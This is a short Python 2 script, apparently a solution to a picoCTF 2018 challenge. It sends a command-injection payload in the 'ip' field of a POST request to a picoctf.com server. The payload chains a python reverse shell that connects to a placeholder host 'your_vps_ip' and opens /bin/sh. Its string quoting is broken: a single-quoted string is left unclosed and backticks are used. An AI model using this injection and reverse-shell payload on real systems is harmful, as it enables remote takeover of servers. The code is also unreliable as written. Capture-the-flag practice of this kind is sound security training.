# coding=utf-8

import requests
import sys

reload(sys)
sys.setdefaultencoding('utf-8')

payload='0.0.0.0;python -c `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("your_vps_ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`

r=requests.post('http://2018shell3.picoctf.com:8587/index.php',
  data={
    'ip':payload
  }
)

text=r.content.decode('big5')
print text